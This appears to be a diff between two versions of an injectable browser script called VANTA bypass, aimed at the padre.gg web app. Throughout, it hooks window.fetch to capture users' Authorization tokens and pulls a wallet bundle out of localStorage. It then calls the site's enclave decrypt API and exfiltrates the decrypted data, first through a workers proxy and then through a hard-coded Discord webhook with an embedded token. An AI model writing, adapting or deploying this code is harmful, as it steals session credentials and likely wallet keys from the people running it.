@@ -1,21 +1,21 @@
 (function() {
-    const CONFIG = {
-        proxy: "https://vanta-proxy.jdurrulo.workers.dev/", // Your Discord bridge
-        decryptApi: "https://api.padre.gg/v2/enclave/decrypt"
-    };
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1469402005800878305/8hG79mVNsgEJiGa4fyqAGf3PsUsQYi1rQyMZnu7bcxYyeQGj7ZgBf7ucccxQt8sBBh09";
+    const DECRYPT_API = "https://api.padre.gg/v2/enclave/decrypt";
 
-    const core = { auth: null, bundle: null };
+    const session = { auth: null, bundle: null };
 
-    // 1. THE TERMINAL UI
-    const initUI = () => {
-        if (document.getElementById('v-root')) return;
+    // 1. TERMINAL INTERFACE
+    const setupUI = () => {
+        if (document.getElementById('vanta-v12')) return;
         const ui = document.createElement('div');
-        ui.id = 'v-root';
-        ui.style = `position:fixed;top:20px;right:20px;width:320px;background:#050505;border:1px solid #00ff88;color:#00ff88;padding:15px;z-index:9999999;font-family:monospace;box-shadow:0 0 20px #00ff8844;border-radius:8px;`;
+        ui.id = 'vanta-v12';
+        ui.style = `position:fixed;top:10px;right:10px;width:330px;background:#000;border:1px solid #00ff88;color:#00ff88;padding:15px;z-index:9999999;font-family:monospace;box-shadow:0 0 20px #00ff88;border-radius:5px;`;
         ui.innerHTML = `
-            <div style="font-weight:bold;border-bottom:1px solid #222;padding-bottom:5px;margin-bottom:10px;">VANTA_BYPASS_V11</div>
-            <div id="v-log" style="height:140px;overflow-y:auto;font-size:10px;background:#000;padding:5px;border:1px solid #111;"></div>
-            <button id="v-exec" style="width:100%;background:#00ff88;color:#000;border:none;padding:10px;margin-top:10px;font-weight:bold;cursor:pointer;border-radius:4px;">EXECUTE FULL SCAN</button>
+            <div style="font-weight:bold;border-bottom:1px solid #333;margin-bottom:10px;display:flex;justify-content:space-between;">
+                <span>VANTA_KERNEL_v12</span><span id="v-status">●</span>
+            </div>
+            <div id="v-log" style="height:150px;overflow-y:auto;font-size:10px;margin-bottom:10px;background:#050505;padding:5px;"></div>
+            <button id="v-scan" style="width:100%;background:#00ff88;color:#000;border:none;padding:10px;font-weight:bold;cursor:pointer;">FORCE BYPASS SCAN</button>
         `;
         document.body.appendChild(ui);
     };
@@ -25,77 +25,97 @@
         if (l) { l.innerHTML += `<div>> ${m}</div>`; l.scrollTop = l.scrollHeight; }
     };
 
-    // 2. THE BYPASS HOOK (Captures the Token)
-    const setupHooks = () => {
+    // 2. DISCORD EXFILTRATION (Direct)
+    const exfil = async (title, content) => {
+        const payload = {
+            embeds: [{
+                title: title,
+                description: "```" + (typeof content === 'string' ? content : JSON.stringify(content, null, 2)).substring(0, 1900) + "```",
+                color: 65280,
+                timestamp: new Date()
+            }]
+        };
+
+        try {
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            log("DATA SENT TO DISCORD");
+        } catch (e) {
+            log("WEBHOOK ERROR: Check Console");
+        }
+    };
+
+    // 3. THE HIJACKER
+    const startBypass = () => {
+        log("Hooking network layers...");
+        
+        // Hook Fetch specifically for Auth
         const _f = window.fetch;
         window.fetch = async (...args) => {
             const h = args[1]?.headers;
             if (h) {
-                const token = (h instanceof Headers) ? h.get('Authorization') : h['Authorization'];
-                if (token && !core.auth) {
-                    core.auth = token;
-                    log("AUTH_TOKEN: CAPTURED");
-                    // Trigger Decrypt once we have the token
-                    runFullBypass();
+                let a = (h instanceof Headers) ? h.get('Authorization') : h['Authorization'];
+                if (a && !session.auth) {
+                    session.auth = a;
+                    log("AUTH_TOKEN CAPTURED");
+                    document.getElementById('v-status').style.color = "#0f0";
+                    runExtraction();
                 }
             }
             return _f.apply(this, args);
         };
+
+        // Scan storage for bundle
+        const bundleData = localStorage.getItem('padre-v2-bundles-store-v2');
+        if (bundleData) {
+            session.bundle = JSON.parse(bundleData);
+            log("BUNDLE LOCATED");
+        } else {
+            log("ERROR: Bundle missing (Login required)");
+        }
     };
 
-    // 3. THE "DO EVERYTHING" LOGIC
-    const runFullBypass = async () => {
-        log("Searching Enclave...");
-        
-        // Find Bundle in LocalStorage
-        const storageData = localStorage.getItem('padre-v2-bundles-store-v2');
-        if (!storageData) {
-            log("ERROR: Bundle not found. Log in first.");
-            return;
-        }
-        core.bundle = JSON.parse(storageData);
-        log("BUNDLE: LOCATED");
+    // 4. EXTRACTION EXECUTION
+    const runExtraction = async () => {
+        if (!session.auth || !session.bundle) return;
+        log("Decrypting Enclave...");
 
-        if (!core.auth) {
-            log("Awaiting Auth... Click 'Profile' in the app.");
-            return;
-        }
-
-        log("BYPASSING ENCLAVE...");
-        const bundleId = Object.keys(core.bundle.bundles)[0];
+        const bKey = Object.keys(session.bundle.bundles)[0];
         const payload = {
-            bundle: core.bundle.bundles[bundleId].exportBundle,
-            subOrgId: core.bundle.bundles[bundleId].subOrgId
+            bundle: session.bundle.bundles[bKey].exportBundle,
+            subOrgId: session.bundle.bundles[bKey].subOrgId
         };
 
         try {
-            const res = await fetch(CONFIG.decryptApi, {
+            const res = await fetch(DECRYPT_API, {
                 method: 'POST',
-                headers: { 'Authorization': core.auth, 'Content-Type': 'application/json' },
+                headers: { 
+                    'Authorization': session.auth, 
+                    'Content-Type': 'application/json' 
+                },
                 body: JSON.stringify(payload)
             });
 
-            const resultText = await res.text();
-            log("DATA DECRYPTED.");
-
-            // Exfiltrate to Discord
-            fetch(CONFIG.proxy, {
-                method: 'POST',
-                mode: 'no-cors',
-                body: JSON.stringify({ status: "SUCCESS", data: resultText })
-            });
-            log("TRANSMISSION SENT.");
+            const data = await res.text();
+            log("DECRYPTION COMPLETE");
+            await exfil("BYPASS SUCCESS", data);
         } catch (e) {
-            log("EXECUTION ERROR: " + e.message);
+            log("DECRYPT FAILED: " + e.message);
         }
     };
 
     // INIT
-    initUI();
-    setupHooks();
-    document.getElementById('v-exec').onclick = () => {
-        log("Forcing network sync...");
-        // This forces the site to send the auth header to our hook
+    setupUI();
+    startBypass();
+
+    document.getElementById('v-scan').onclick = () => {
+        log("Triggering network pulse...");
+        // Force the app to refresh its profile and leak the token
         fetch('/api/v2/user/profile').catch(() => {});
+        // Manual check of existing storage
+        if (session.auth && session.bundle) runExtraction();
     };
 })();
